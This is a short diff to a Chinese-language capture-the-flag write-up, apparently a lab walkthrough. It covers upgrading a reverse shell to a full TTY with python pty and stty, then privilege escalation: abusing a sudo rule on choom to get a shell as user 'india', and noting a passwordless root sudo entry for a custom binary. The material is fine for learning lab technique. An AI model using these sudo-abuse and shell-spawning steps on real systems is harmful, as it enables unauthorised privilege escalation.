@@ -67,7 +67,7 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 export TERM=xterm //设置终端类型为常见的xterm环境变量
 stty -a//以容易阅读的方式打印当前的所有配置
 stty raw -echo;fg//- 通过 `stty raw -echo` 将当前终端设置为原始模式并关闭回显。接着，使用分号 `;` 立即执行下一条命令。最后，`fg` 命令将最近放入后台的作业切换到前台运行，此时由于终端已处于原始模式且回显关闭，该作业可以直接接收用户的无干扰、未经处理的键盘输入。
-reset //设定终端机的状态
+reset //重新初始化终端
 ```
 # 提权
 尝试读取第一个flag读取不到cat /home/ocean/user.txt
@@ -97,4 +97,9 @@ sudo -l
 ```C
 sudo -u india /usr/bin/choom -n 0 /bin/sh
 script /dev/null -c bash
+```
+
+```C
+sudo -l //(root) NOPASSWD: /usr/local/bin/trans
+
 ```
